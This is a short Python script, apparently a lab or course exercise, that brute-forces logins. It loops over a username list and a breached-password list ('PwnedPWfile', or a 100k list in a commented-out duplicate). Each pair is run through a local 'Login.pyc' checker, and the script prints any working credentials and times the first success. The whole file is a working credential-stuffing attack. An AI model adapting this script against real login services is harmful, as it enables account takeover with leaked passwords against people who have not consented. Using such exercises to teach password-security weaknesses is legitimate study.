import subprocess
import time
f = open("PwnedPWfile")
with open('PwnedPWfile') as f:
    passwords = [line.rstrip('\n') for line in f]
f.close()


f = open("gang")
with open('gang') as f:
    gang = [line.rstrip('\n') for line in f]
f.close()


start = time.time()
logins = 0
recordTime = False
for i in range(len(gang)):
    
    for k in range(len(passwords)):
        
        result = subprocess.run(["python3", "Login.pyc", gang[i], passwords[k]], capture_output = True, text = True)
        if result.stdout == "Login successful.\n":
            print(result.stdout)
            print(gang[i])
            print( passwords[k])
            logins += 1
            if logins == 1: 
                recordTime = True
            break

    if recordTime == True:
        end = time.time()
        recordTime = False
    
                
time_total = end - start
print(f"Time take: {time_total}")

##############################################################

# import subprocess
# import time
# f = open("PwnedPWs100k")
# with open('PwnedPWs100k') as f:
#     passwords = [line.rstrip('\n') for line in f]
# f.close()


# f = open("gang")
# with open('gang') as f:
#     gang = [line.rstrip('\n') for line in f]
# f.close()


# #gang.remove("RiverOrangeTiger809")
# #gang.remove( "SkyRedFalcon914")

# start = time.time()
# logins = 0
# recordTime = False
# for i in range(len(gang)):

#     for k in range(len(passwords)):

#         result = subprocess.run(["python3", "Login.pyc", gang[i], passwords[k]], capture_output = True, text = True)
#         if result.stdout == "Login successful.\n":
#             print(result.stdout)
#             print(gang[i])
#             print( passwords[k])
#             logins += 1
#             if logins == 1: 
#                 recordTime = True
#             break

#     if recordTime == True:
#         end = time.time()
#         recordTime = False


# time_total = end - start
# print(f"Time take: {time_total}")